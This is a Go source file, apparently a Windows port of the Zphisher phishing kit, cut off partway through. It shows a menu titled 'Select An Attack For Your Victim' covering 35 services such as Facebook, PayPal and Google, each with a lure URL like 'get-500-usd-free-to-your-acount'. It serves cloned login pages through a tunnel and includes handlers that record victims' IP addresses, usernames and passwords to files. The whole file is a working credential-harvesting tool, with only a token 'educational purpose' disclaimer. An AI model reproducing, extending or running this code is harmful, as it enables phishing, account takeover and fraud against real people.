package main

import (
	"archive/zip"
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Attack represents a website and mask for the tunneling
type Attack struct {
	Website string
	Mask string
	Service string
}

var (
	PORT = 8080
)

const (
	HOST = "127.0.0.1"
	Version = "1.0"

	// Ansi color codes
	Red       = "\033[31m"
	Green     = "\033[32m"
	Orange    = "\033[33m"
	Blue      = "\033[34m"
	Magenta   = "\033[35m"
	Cyan      = "\033[36m"
	White     = "\033[37m"
	Black     = "\033[30m"
	RedBG     = "\033[41m"
	GreenBG   = "\033[42m"
	OrangeBG  = "\033[43m"
	BlueBG    = "\033[44m"
	MagentaBG = "\033[45m"
	CyanBG    = "\033[46m"
	WhiteBG   = "\033[47m"
	BlackBG   = "\033[40m"
	ResetBG   = "\033[0m\n"
)

var serviceMap = map[int]string{
    1:  "Facebook",
    2:  "Instagram",
    3:  "Google",
    4:  "Microsoft",
    5:  "Netflix",
    6:  "Paypal",
    7:  "Steam",
    8:  "Twitter",
    9:  "Playstation",
    10: "Tiktok",
    11: "Twitch",
    12: "Pinterest",
    13: "Snapchat",
    14: "Linkedin",
    15: "Ebay",
    16: "Quora",
    17: "Protonmail",
    18: "Spotify",
    19: "Reddit",
    20: "Adobe",
    21: "DeviantArt",
    22: "Badoo",
    23: "Origin",
    24: "DropBox",
    25: "Yahoo",
    26: "Wordpress",
    27: "Yandex",
    28: "StackoverFlow",
    29: "Vk",
    30: "XBOX",
    31: "Mediafire",
    32: "Gitlab",
    33: "Github",
    34: "Discord",
    35: "Roblox",
    99: "About",
    0:  "Exit",
}

func setupDirectories() error {
	// Get the base directory (equivalent to realpath "$(dirname "$BASH_SOURCE")")
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	baseDir := filepath.Dir(exe)

	// Create .server directory if it doesnt exist
	serverDir := filepath.Join(baseDir, ".server")
	if _, err := os.Stat(serverDir); os.IsNotExist(err) {
		if err := os.MkdirAll(serverDir, 0755); err != nil {
			return err
		}
	}

	// Create auth directory if it doesnt exist
	authDir := filepath.Join(baseDir, "auth")
	if _, err := os.Stat(authDir); os.IsNotExist(err) {
		if err := os.MkdirAll(authDir, 0755); err != nil {
			return err
		}
	}

	// Handle .server/www directory: remove if exists, then create
	wwwDir := filepath.Join(serverDir, "www")
	if _, err := os.Stat(wwwDir); os.IsNotExist(err) {
		if err := os.RemoveAll(wwwDir); err != nil {
			return err
		}
	}
	if err := os.MkdirAll(wwwDir, 0755); err != nil {
		return err
	}

	// Remove .server/.localx if it exists
	loclxPath := filepath.Join(serverDir, ".loclx")
	if _, err := os.Stat(loclxPath); !os.IsNotExist(err) {
		if err := os.RemoveAll(loclxPath); err != nil {
			return err
		}
	}

	// Remove .server/.cld.log if it exists
	cldLogPath := filepath.Join(serverDir, ".cld.log")
	if _, err := os.Stat(cldLogPath); !os.IsNotExist(err) {
		if err := os.RemoveAll(cldLogPath); err != nil {
			return err
		}
	}

	return nil
}

// Reset terminal colors
func resetColor() {
	fmt.Print("\033[0m") // Reset all attributes and colors
}

// Kill running processes (Windows-compatible)
func killPID() error {
	processes := []string{"cloudflared.exe"}
	for _, process := range processes {
		// Use tasklist to check if process is running
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", process))
		output, err := cmd.Output()
		if err == nil && strings.Contains(string(output), process) { // Process exists
			// Use taskkill to terminate the process
			if err := exec.Command("taskkill", "/IM", process, "/F").Run(); err != nil {
				return fmt.Errorf("failed to kill process %s: %v", process, err)
			}
		}
	}
	return nil
}

// Check internet status
func checkStatus() {
	fmt.Printf("\n%s[%s+%s]%s Internet Status : ", Green, White, Green, Cyan)
	client := &http.Client{
		Timeout: 3 * time.Second, // Timeout after 3 seconds
	}
	resp, err := client.Head("https://api.github.com")
	if err == nil && resp.StatusCode == http.StatusOK {
		fmt.Printf("%sOnline%s\n", Green, White)
		// Note: check_update is omitted as per your request
	} else {
		fmt.Printf("%sOffline%s\n", Red, White)
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func banner() {
	fmt.Printf(`
%s
%s ______      _     _     _               
%s|___  /     | |   (_)   | |              
%s   / / _ __ | |__  _ ___| |__   ___ _ __ 
%s  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
%s / /__| |_) | | | | \__ \ | | |  __/ |   
%s/_____| .__/|_| |_|_|___/_| |_|\___|_|   
%s      | |                                
%s      |_|                %sVersion : %s

%s[%s-%s]%s Tool Created by htr-tech (tahmid.rayat). Translated to Go and Windows by Scrimzay.%s
`,
		Orange, Orange, Orange, Orange, Orange, Orange, Orange, Orange, Orange,
		Red, Version, Green, White, Green, Cyan, White)
}

func bannerSmall() {
	fmt.Printf(`
%s
%s  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
%s  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
%s  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀%s %s
`,
		Blue, Blue, Blue, Blue, White, Version)
}

// Check and install dependencies (Windows-compatible, no PHP)
func dependencies() error {
	fmt.Printf("\n%s[%s+%s]%s Installing required packages...\n", Green, White, Green, Cyan)

	// Check for curl (included in Windows 10 build 17063+)
	cmd := exec.Command("curl", "--version")
	if err := cmd.Run(); err != nil {
		fmt.Printf("\n%s[%s!%s]%s curl is required but not installed.\n", Red, White, Red, Red)
		fmt.Printf("%sPlease install curl (e.g., via winget or download from https://curl.se/windows/) and ensure it's in your PATH.%s\n", Red, White)
		resetColor()
		return fmt.Errorf("curl not found")
	}
	fmt.Printf("\n%s[%s+%s]%s Package : %scurl%s already installed.\n", Green, White, Green, Cyan, Orange, Cyan)

	// No need for unzip (handled by Go's archive/zip)
	// No need for proot or ncurses-utils (Termux-specific)
	// No need for PHP (using Go web server)

	fmt.Printf("\n%s[%s+%s]%s All required packages installed.\n", Green, White, Green, Green)
	return nil
}

// Download and process binaries
func download(url, output string) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	baseDir := filepath.Dir(exe)
	serverDir := filepath.Join(baseDir, ".server")
	file := filepath.Base(url)

	// Remove existing file or output
	for _, f := range []string{file, filepath.Join(serverDir, output)} {
		if _, err := os.Stat(f); !os.IsNotExist(err) {
			if err := os.RemoveAll(f); err != nil {
				return fmt.Errorf("failed to remove %s: %v", f, err)
			}
		}
	}

	// Download file using curl
	cmd := exec.Command("curl", "--silent", "--insecure", "--fail", "--retry-connrefused",
		"--retry", "3", "--retry-delay", "2", "--location", "--output", file, url)
	if err := cmd.Run(); err != nil {
		fmt.Printf("\n%s[%s!%s]%s Error occurred while downloading %s.\n", Red, White, Red, Red, output)
		resetColor()
		return fmt.Errorf("failed to download %s: %v", url, err)
	}

	// Check if file was downloaded
	if _, err := os.Stat(file); os.IsNotExist(err) {
		fmt.Printf("\n%s[%s!%s]%s Error occurred while downloading %s.\n", Red, White, Red, Red, output)
		resetColor()
		return fmt.Errorf("downloaded file %s not found", file)
	}

	// Process the downloaded file
	ext := strings.ToLower(filepath.Ext(file))
	outputPath := filepath.Join(serverDir, output)
	switch ext {
	case ".zip":
		r, err := zip.OpenReader(file)
		if err != nil {
			os.Remove(file)
			return fmt.Errorf("failed to open zip %s: %v", file, err)
		}
		defer r.Close()

		for _, f := range r.File {
			if f.Name == output {
				rc, err := f.Open()
				if err != nil {
					os.Remove(file)
					return fmt.Errorf("failed to read %s from zip: %v", output, err)
				}
				defer rc.Close()

				outFile, err := os.Create(outputPath)
				if err != nil {
					os.Remove(file)
					return fmt.Errorf("failed to create %s: %v", outputPath, err)
				}
				defer outFile.Close()

				if _, err := io.Copy(outFile, rc); err != nil {
					os.Remove(file)
					return fmt.Errorf("failed to extract %s: %v", output, err)
				}
			}
		}

	case ".exe":
		// Move .exe file to .server/output
		if err := os.Rename(file, outputPath); err != nil {
			os.Remove(file)
			return fmt.Errorf("failed to move %s to %s: %v", file, outputPath, err)
		}

	default:
		fmt.Printf("\n%s[%s!%s]%s Unsupported file type %s for %s.\n", Red, White, Red, Red, ext, output)
		os.Remove(file)
		return fmt.Errorf("unsupported file type %s", ext)
	}

	// Set executable permissions (not strictly needed on Windows)
	if err := os.Chmod(outputPath, 0755); err != nil {
		os.Remove(file)
		return fmt.Errorf("failed to set permissions on %s: %v", outputPath, err)
	}

	os.Remove(file)
	return nil
}

// Install Cloudflared (Windows-compatible)
func installCloudflared() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	baseDir := filepath.Dir(exe)
	cloudflaredPath := filepath.Join(baseDir, ".server", "cloudflared.exe")

	if _, err := os.Stat(cloudflaredPath); !os.IsNotExist(err) {
		fmt.Printf("\n%s[%s+%s]%s Cloudflared already installed.\n", Green, White, Green, Green)
		return nil
	}

	fmt.Printf("\n%s[%s+%s]%s Installing Cloudflared...\n", Green, White, Green, Cyan)
	// Use Windows-specific URL for 64-bit (adjust if you need 32-bit)
	url := "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
	return download(url, "cloudflared.exe")
}

// Exit message
func msgExit() {
	fmt.Print("\033[H\033[2J") // Clear screen (equivalent to clear)
	bannerSmall()
	fmt.Println()
	fmt.Printf("%s%s Thank you for using this tool. Have a good day.%s\n", GreenBG, Black, ResetBG)
	resetColor()
	os.Exit(0)
}

// About
func about() {
	fmt.Print("\033[H\033[2J") // Clear screen
	banner()
	fmt.Println()
	fmt.Printf(`
%s Author   %s:  %sTAHMID RAYAT %s[ %sHTR-TECH %s]
%s Github   %s:  %shttps://github.com/htr-tech
%s Social   %s:  %shttps://tahmidrayat.is-a.dev
%s Version  %s:  %s%s

%s Translator %s: %sScrimzay%s
%s Github %s: %shttps://github.com/Scrimzay

%s %sWarning:%s
%s  This Tool is made for educational purpose 
  only %s!%s Author nor Translator will not be responsible for 
  any misuse of this toolkit %s!

%s %sSpecial Thanks to:%s
%s  1RaY-1, Adi1090x, AliMilani, BDhackers009,
  KasRoudra, E343IO, sepp0, ThelinuxChoice,
  Yisus7u7

%s[%s00%s]%s Main Menu     %s[%s99%s]%s Exit

`,
		Green, Red, Orange, Red, Orange, Red,
		Green, Red, Cyan,
		Green, Red, Cyan,
		Green, Red, Orange, Version,
		Green, Red, Magenta, Red,
		Green, Red, Cyan,
		White, RedBG, ResetBG,
		Cyan, Red, White, Red,
		White, CyanBG, ResetBG,
		Green,
		Red, White, Red, Orange, Red, White, Red, Orange)

	fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
	reader := bufio.NewReader(os.Stdin)
	reply, _ := reader.ReadString('\n')
	reply = strings.TrimSpace(reply)

	switch reply {
	case "99":
		msgExit()
	case "0", "00":
		fmt.Printf("\n%s[%s+%s]%s Returning to main menu...\n", Green, White, Green, Cyan)
		time.Sleep(1 * time.Second)
		mainMenu() // Placeholder; replace with actual main_menu
	default:
		fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
		time.Sleep(1 * time.Second)
		about()
	}
}

// main menu
func mainMenu() {
    fmt.Print("\033[H\033[2J")
    banner()
    fmt.Println()
    fmt.Printf(`
%s[%s::%s]%s Select An Attack For Your Victim %s[%s::%s]%s

%s[%s01%s]%s Facebook      %s[%s11%s]%s Twitch       %s[%s21%s]%s DeviantArt
%s[%s02%s]%s Instagram     %s[%s12%s]%s Pinterest    %s[%s22%s]%s Badoo
%s[%s03%s]%s Google        %s[%s13%s]%s Snapchat     %s[%s23%s]%s Origin
%s[%s04%s]%s Microsoft     %s[%s14%s]%s Linkedin     %s[%s24%s]%s DropBox
%s[%s05%s]%s Netflix       %s[%s15%s]%s Ebay         %s[%s25%s]%s Yahoo
%s[%s06%s]%s Paypal        %s[%s16%s]%s Quora        %s[%s26%s]%s Wordpress
%s[%s07%s]%s Steam         %s[%s17%s]%s Protonmail   %s[%s27%s]%s Yandex
%s[%s08%s]%s Twitter       %s[%s18%s]%s Spotify      %s[%s28%s]%s StackoverFlow
%s[%s09%s]%s Playstation   %s[%s19%s]%s Reddit       %s[%s29%s]%s Vk
%s[%s10%s]%s Tiktok        %s[%s20%s]%s Adobe        %s[%s30%s]%s XBOX
%s[%s31%s]%s Mediafire     %s[%s32%s]%s Gitlab       %s[%s33%s]%s Github
%s[%s34%s]%s Discord       %s[%s35%s]%s Roblox

%s[%s99%s]%s About         %s[%s00%s]%s Exit

`,
        Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange,
        Red, White, Red, Orange, Red, White, Red, Orange)

    fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
    reader := bufio.NewReader(os.Stdin)
    reply, _ := reader.ReadString('\n')
    reply = strings.TrimSpace(reply)

    // Convert reply to int for service lookup
    option, err := strconv.Atoi(reply)
    if err != nil {
        option = -1 // Invalid input
    }
    service, ok := serviceMap[option]
    if !ok {
        service = "Unknown"
    }

    switch reply {
    case "1", "01":
        siteFacebook()
    case "2", "02":
        siteInstagram()
    case "3", "03":
        siteGmail()
    case "4", "04":
        tunnelMenu(Attack{Website: "microsoft", Mask: "https://unlimited-onedrive-space-for-free", Service: service})
    case "5", "05":
        tunnelMenu(Attack{Website: "netflix", Mask: "https://upgrade-your-netflix-plan-free", Service: service})
    case "6", "06":
        tunnelMenu(Attack{Website: "paypal", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "7", "07":
        tunnelMenu(Attack{Website: "steam", Mask: "https://steam-500-usd-gift-card-free", Service: service})
    case "8", "08":
        tunnelMenu(Attack{Website: "twitter", Mask: "https://get-blue-badge-on-twitter-free", Service: service})
    case "9", "09":
        tunnelMenu(Attack{Website: "playstation", Mask: "https://playstation-500-usd-gift-card-free", Service: service})
    case "10":
        tunnelMenu(Attack{Website: "tiktok", Mask: "https://tiktok-free-liker", Service: service})
    case "11":
        tunnelMenu(Attack{Website: "twitch", Mask: "https://unlimited-twitch-tv-user-for-free", Service: service})
    case "12":
        tunnelMenu(Attack{Website: "pinterest", Mask: "https://get-a-premium-plan-for-pinterest-free", Service: service})
    case "13":
        tunnelMenu(Attack{Website: "snapchat", Mask: "https://view-locked-snapchat-accounts-secretly", Service: service})
    case "14":
        tunnelMenu(Attack{Website: "linkedin", Mask: "https://get-a-premium-plan-for-linkedin-free", Service: service})
    case "15":
        tunnelMenu(Attack{Website: "ebay", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "16":
        tunnelMenu(Attack{Website: "quora", Mask: "https://quora-premium-for-free", Service: service})
    case "17":
        tunnelMenu(Attack{Website: "protonmail", Mask: "https://protonmail-pro-basics-for-free", Service: service})
    case "18":
        tunnelMenu(Attack{Website: "spotify", Mask: "https://convert-your-account-to-spotify-premium", Service: service})
    case "19":
        tunnelMenu(Attack{Website: "reddit", Mask: "https://reddit-official-verified-member-badge", Service: service})
    case "20":
        tunnelMenu(Attack{Website: "adobe", Mask: "https://get-adobe-lifetime-pro-membership-free", Service: service})
    case "21":
        tunnelMenu(Attack{Website: "deviantart", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "22":
        tunnelMenu(Attack{Website: "badoo", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "23":
        tunnelMenu(Attack{Website: "origin", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "24":
        tunnelMenu(Attack{Website: "dropbox", Mask: "https://get-1TB-cloud-storage-free", Service: service})
    case "25":
        tunnelMenu(Attack{Website: "yahoo", Mask: "https://grab-mail-from-anyother-yahoo-account-free", Service: service})
    case "26":
        tunnelMenu(Attack{Website: "wordpress", Mask: "https://unlimited-wordpress-traffic-free", Service: service})
    case "27":
        tunnelMenu(Attack{Website: "yandex", Mask: "https://grab-mail-from-anyother-yandex-account-free", Service: service})
    case "28":
        tunnelMenu(Attack{Website: "stackoverflow", Mask: "https://get-stackoverflow-lifetime-pro-membership-free", Service: service})
    case "29":
        siteVk()
    case "30":
        tunnelMenu(Attack{Website: "xbox", Mask: "https://get-500-usd-free-to-your-acount", Service: service})
    case "31":
        tunnelMenu(Attack{Website: "mediafire", Mask: "https://get-1TB-on-mediafire-free", Service: service})
    case "32":
        tunnelMenu(Attack{Website: "gitlab", Mask: "https://get-1k-followers-on-gitlab-free", Service: service})
    case "33":
        tunnelMenu(Attack{Website: "github", Mask: "https://get-1k-followers-on-github-free", Service: service})
    case "34":
        tunnelMenu(Attack{Website: "discord", Mask: "https://get-discord-nitro-free", Service: service})
    case "35":
        tunnelMenu(Attack{Website: "roblox", Mask: "https://get-free-robux", Service: service})
    case "99":
        about()
    case "0", "00":
        msgExit()
    default:
        fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
        time.Sleep(1 * time.Second)
        mainMenu()
    }
}

// Facebook site menu
func siteFacebook() {
	fmt.Printf(`
%s[%s01%s]%s Traditional Login Page
%s[%s02%s]%s Advanced Voting Poll Login Page
%s[%s03%s]%s Fake Security Login Page
%s[%s04%s]%s Facebook Messenger Login Page

`,
		Red, White, Red, Orange,
		Red, White, Red, Orange,
		Red, White, Red, Orange,
		Red, White, Red, Orange)

	fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
	reader := bufio.NewReader(os.Stdin)
	reply, _ := reader.ReadString('\n')
	reply = strings.TrimSpace(reply)

	switch reply {
	case "1", "01":
		tunnelMenu(Attack{Website: "facebook", Mask: "https://blue-verified-badge-for-facebook-free"})
	case "2", "02":
		tunnelMenu(Attack{Website: "fb_advanced", Mask: "https://vote-for-the-best-social-media"})
	case "3", "03":
		tunnelMenu(Attack{Website: "fb_security", Mask: "https://make-your-facebook-secured-and-free-from-hackers"})
	case "4", "04":
		tunnelMenu(Attack{Website: "fb_messenger", Mask: "https://get-messenger-premium-features-free"})
	default:
		fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
		fmt.Print("\033[H\033[2J")
		bannerSmall()
		time.Sleep(1 * time.Second)
		siteFacebook()
	}
}

// Instagram site menu
func siteInstagram() {
	fmt.Printf(`
%s[%s01%s]%s Traditional Login Page
%s[%s02%s]%s Auto Followers Login Page
%s[%s03%s]%s 1000 Followers Login Page
%s[%s04%s]%s Blue Badge Verify Login Page

`,
		Red, White, Red, Orange,
		Red, White, Red, Orange,
		Red, White, Red, Orange,
		Red, White, Red, Orange)

	fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
	reader := bufio.NewReader(os.Stdin)
	reply, _ := reader.ReadString('\n')
	reply = strings.TrimSpace(reply)

	switch reply {
	case "1", "01":
		tunnelMenu(Attack{Website: "instagram", Mask: "https://get-unlimited-followers-for-instagram"})
	case "2", "02":
		tunnelMenu(Attack{Website: "ig_followers", Mask: "https://get-unlimited-followers-for-instagram"})
	case "3", "03":
		tunnelMenu(Attack{Website: "insta_followers", Mask: "https://get-1000-followers-for-instagram"})
	case "4", "04":
		tunnelMenu(Attack{Website: "ig_verify", Mask: "https://blue-badge-verify-for-instagram-free"})
	default:
		fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
		fmt.Print("\033[H\033[2J")
		bannerSmall()
		time.Sleep(1 * time.Second)
		siteInstagram()
	}
}

// Gmail/Google site menu
func siteGmail() {
	fmt.Printf(`
%s[%s01%s]%s Gmail Old Login Page
%s[%s02%s]%s Gmail New Login Page
%s[%s03%s]%s Advanced Voting Poll

`,
		Red, White, Red, Orange,
		Red, White, Red, Orange,
		Red, White, Red, Orange)

	fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
	reader := bufio.NewReader(os.Stdin)
	reply, _ := reader.ReadString('\n')
	reply = strings.TrimSpace(reply)

	switch reply {
	case "1", "01":
		tunnelMenu(Attack{Website: "google", Mask: "https://get-unlimited-google-drive-free"})
	case "2", "02":
		tunnelMenu(Attack{Website: "google_new", Mask: "https://get-unlimited-google-drive-free"})
	case "3", "03":
		tunnelMenu(Attack{Website: "google_poll", Mask: "https://vote-for-the-best-social-media"})
	default:
		fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
		fmt.Print("\033[H\033[2J")
		bannerSmall()
		time.Sleep(1 * time.Second)
		siteGmail()
	}
}

// Vk site menu
func siteVk() {
	fmt.Printf(`
%s[%s01%s]%s Traditional Login Page
%s[%s02%s]%s Advanced Voting Poll Login Page

`,
		Red, White, Red, Orange,
		Red, White, Red, Orange)

	fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
	reader := bufio.NewReader(os.Stdin)
	reply, _ := reader.ReadString('\n')
	reply = strings.TrimSpace(reply)

	switch reply {
	case "1", "01":
		tunnelMenu(Attack{Website: "vk", Mask: "https://vk-premium-real-method-2020"})
	case "2", "02":
		tunnelMenu(Attack{Website: "vk_poll", Mask: "https://vote-for-the-best-social-media"})
	default:
		fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
		fmt.Print("\033[H\033[2J")
		bannerSmall()
		time.Sleep(1 * time.Second)
		siteVk()
	}
}

// Choose custom port (handled in tunnel)
// func cusport() error {
// 	fmt.Printf("\n%s[%s?%s]%s Do You Want A Custom Port %s[%sy%s/%sN%s]: %s", Red, White, Red, Orange, Green, Cyan, Green, Cyan, Green, Orange)
// 	reader := bufio.NewReader(os.Stdin)
// 	pAns, _ := reader.ReadString('\n')
// 	pAns = strings.TrimSpace(pAns)

// 	if strings.ToLower(pAns) == "y" {
// 		fmt.Printf("\n%s[%s-%s]%s Enter Your Custom 4-digit Port [1024-9999] : %s", Red, White, Red, Orange, White)
// 		cuP, _ := reader.ReadString('\n')
// 		cuP = strings.TrimSpace(cuP)

// 		portNum, err := strconv.Atoi(cuP)
// 		if err != nil || len(cuP) != 4 || portNum < 1024 || portNum > 9999 {
// 			fmt.Printf("\n\n%s[%s!%s]%s Invalid 4-digit Port : %s, Try Again...%s", Red, White, Red, Red, cuP, White)
// 			fmt.Print("\033[H\033[2J")
// 			bannerSmall()
// 			time.Sleep(2 * time.Second)
// 			return cusport()
// 		}
// 		PORT = portNum
// 		fmt.Println()
// 	} else {
// 		fmt.Printf("\n\n%s[%s-%s]%s Using Default Port %d...%s\n", Red, White, Red, Blue, PORT, White)
// 	}
// 	return nil
// }

// Setup website and start Go HTTP server
func setupSite(website, service string) error {
    fmt.Printf("\n%s[%s-%s]%s Setting up server...%s\n", Red, White, Red, Blue, White)

    // Copy website files from .sites/$website to .server/www
    exe, err := os.Executable()
    if err != nil {
        return err
    }
    baseDir := filepath.Dir(exe)
    srcDir := filepath.Join(baseDir, ".sites", website)
    dstDir := filepath.Join(baseDir, ".server", "www")

    if err := copyDir(srcDir, dstDir); err != nil {
        return fmt.Errorf("failed to copy website files from %s to %s: %v", srcDir, dstDir, err)
    }

    fmt.Printf("\n%s[%s-%s]%s Starting Go HTTP server...%s\n", Red, White, Red, Blue, White)

    // Start Go HTTP server
    go func() {
        mux := http.NewServeMux()
        // Serve static files from .server/www
        fileServer := http.FileServer(http.Dir(dstDir))
        mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
            // Serve login.html for root path instead of index.php
            if r.URL.Path == "/" || r.URL.Path == "/index.php" {
                http.ServeFile(w, r, filepath.Join(dstDir, "login.html"))
                return
            }
            fileServer.ServeHTTP(w, r)
        })

        // Handler for capturing IP
        mux.HandleFunc("/ip", func(w http.ResponseWriter, r *http.Request) {
            ip := r.RemoteAddr
            if clientIP := r.Header.Get("HTTP_CLIENT_IP"); clientIP != "" {
                ip = clientIP
            } else if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
                if idx := strings.Index(forwarded, ","); idx != -1 {
                    ip = strings.TrimSpace(forwarded[:idx])
                } else {
                    ip = forwarded
                }
            } else {
                if idx := strings.LastIndex(ip, ":"); idx != -1 {
                    ip = ip[:idx]
                }
            }
            userAgent := r.Header.Get("User-Agent")
            f, err := os.OpenFile(filepath.Join(dstDir, "ip.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
            if err != nil {
                fmt.Fprintf(os.Stderr, "Error writing ip.txt: %v\n", err)
                http.Error(w, "Internal Server Error", http.StatusInternalServerError)
                return
            }
            defer f.Close()
            fmt.Fprintf(f, "IP: %s\r\nUser-Agent: %s\n\n", ip, userAgent)
            http.Redirect(w, r, "/login.html", http.StatusFound)
        })

        // Handler for capturing credentials
        mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
            if r.Method != http.MethodPost {
                http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
                return
            }
            if err := r.ParseForm(); err != nil {
                fmt.Fprintf(os.Stderr, "Error parsing form: %v\n", err)
                http.Error(w, "Bad Request", http.StatusBadRequest)
                return
            }
            username := r.FormValue("username")
            password := r.FormValue("password")
            if username != "" && password != "" {
                f, err := os.OpenFile(filepath.Join(dstDir, "usernames.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                if err != nil {
                    fmt.Fprintf(os.Stderr, "Error writing usernames.txt: %v\n", err)
                    http.Error(w, "Internal Server Error", http.StatusInternalServerError)
                    return
                }
                defer f.Close()
                // Use service name in credential format
                fmt.Fprintf(f, "%s Username: %s Pass: %s\n", service, username, password)
            }
            // Redirect to / to refresh the page
            http.Redirect(w, r, "/", http.StatusFound)
        })

        addr := fmt.Sprintf("%s:%d", HOST, PORT)
        if err := http.ListenAndServe(addr, mux); err != nil {
            fmt.Fprintf(os.Stderr, "Error starting HTTP server: %v\n", err)
        }
    }()

    return nil
}

// captureIp captures and logs the victim's IP address
func captureIp() error {
    exe, err := os.Executable()
    if err != nil {
        return err
    }
    baseDir := filepath.Dir(exe)
    ipFile := filepath.Join(baseDir, ".server", "www", "ip.txt")
    authFile := filepath.Join(baseDir, "auth", "ip.txt")

    data, err := os.ReadFile(ipFile)
    if err != nil {
        return fmt.Errorf("failed to read ip.txt: %v", err)
    }

    // Split by double newline to handle ip.php format
    entries := strings.Split(string(data), "\n\n")
    for _, entry := range entries {
        lines := strings.Split(entry, "\n")
        var ip string
        for _, line := range lines {
            if strings.HasPrefix(line, "IP: ") {
                ip = strings.TrimSpace(strings.TrimPrefix(line, "IP: "))
                break
            }
        }
        if ip != "" {
            fmt.Printf("\n%s[%s-%s]%s Victim's IP : %s%s%s\n", Red, White, Red, Green, Blue, ip, White)
            fmt.Printf("%s[%s-%s]%s Saved in : %sauth/ip.txt%s\n", Red, White, Red, Blue, Orange, White)

            f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
            if err != nil {
                return fmt.Errorf("failed to write to auth/ip.txt: %v", err)
            }
            defer f.Close()
            fmt.Fprintf(f, "%s\n", entry) // Save full entry (IP and User-Agent)
            return nil
        }
    }
    return fmt.Errorf("no IP found in ip.txt")
}

// captureCreds captures and logs the victim's credentials
func captureCreds() error {
    exe, err := os.Executable()
    if err != nil {
        return err
    }
    baseDir := filepath.Dir(exe)
    credFile := filepath.Join(baseDir, ".server", "www", "usernames.txt")
    authFile := filepath.Join(baseDir, "auth", "usernames.dat")

    data, err := os.ReadFile(credFile)
    if err != nil {
        return fmt.Errorf("failed to read usernames.txt: %v", err)
    }

    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        if strings.Contains(line, " Username: ") && strings.Contains(line, " Pass: ") {
            // Split on " Username: " to get service and rest
            parts := strings.SplitN(line, " Username: ", 2)
            if len(parts) != 2 {
                continue
            }
            service := parts[0] // e.g., "Facebook"
            // Split rest on " Pass: " to get username and password
            subParts := strings.SplitN(parts[1], " Pass: ", 2)
            if len(subParts) != 2 {
                continue
            }
            username := subParts[0]
            password := subParts[1]
            if username != "" && password != "" {
                fmt.Printf("\n%s[%s-%s]%s Service : %s%s%s\n", Red, White, Red, Green, Blue, service, White)
                fmt.Printf("%s[%s-%s]%s Account : %s%s%s\n", Red, White, Red, Green, Blue, username, White)
                fmt.Printf("%s[%s-%s]%s Password : %s%s%s\n", Red, White, Red, Green, Blue, password, White)
                fmt.Printf("%s[%s-%s]%s Saved in : %sauth/usernames.dat%s\n", Red, White, Red, Blue, Orange, White)
                fmt.Printf("%s[%s-%s]%s Waiting for Next Login Info, %sCtrl + C %sto exit. %s\n", Red, White, Red, Orange, Blue, Orange, White)

                f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                if err != nil {
                    return fmt.Errorf("failed to write to auth/usernames.dat: %v", err)
                }
                defer f.Close()
                fmt.Fprintf(f, "%s\n", line)
                return nil
            }
        }
    }
    return fmt.Errorf("no credentials found in usernames.txt")
}

// Print data
func captureData() error {
